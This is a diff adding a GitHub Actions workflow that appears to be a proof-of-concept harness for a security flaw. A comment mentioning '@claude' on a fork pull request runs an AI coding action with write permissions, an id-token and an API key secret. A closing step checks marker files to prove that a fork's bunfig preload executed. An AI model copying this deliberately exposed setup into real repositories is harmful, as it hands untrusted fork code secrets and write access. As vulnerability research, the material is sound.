@@ -1,0 +1,46 @@
+name: PoC — fork PR comment trigger
+
+on:
+  issue_comment:
+    types: [created]
+
+permissions:
+  contents: write
+  pull-requests: write
+  issues: write
+  id-token: write
+
+jobs:
+  bunfig-fork-poc:
+    if: |
+      github.event.issue.pull_request &&
+      contains(github.event.comment.body, '@claude')
+    runs-on: ubuntu-latest
+    steps:
+      # Matches examples/claude.yml: default branch checkout only (no refs/pull/N/head).
+      # Fork PR head is materialized in workspace by claude-code-action setupBranch (tag mode).
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+
+      - uses: anthropics/claude-code-action@f87768c6d25f92ae6efa7175e223ef77d4cbf97f
+        with:
+          anthropic_api_key: ${{ secrets.ANTHROPIC_API_KEY }}
+          show_full_output: true
+
+      - name: Collect preload proof
+        if: always()
+        run: |
+          echo "=== BUNFIG_FORK_COLLECTOR ==="
+          grep -E "from a fork|Restoring \.claude|POC-A2|BUNFIG_PRELOAD|Switched to branch|github-comment-server|install-mcp|bun run" "$GITHUB_STEP_SUMMARY" 2>/dev/null || true
+          MARKER="${RUNNER_TEMP}/poc-a2-bunfig.txt"
+          if [ -f "$MARKER" ]; then
+            cat "$MARKER"
+          else
+            echo "BUNFIG_PRELOAD marker=absent"
+          fi
+          WS_PROOF="${GITHUB_WORKSPACE}/.poc-bunfig-proof.txt"
+          if [ -f "$WS_PROOF" ]; then
+            echo "=== workspace proof ==="
+            cat "$WS_PROOF"
+          fi
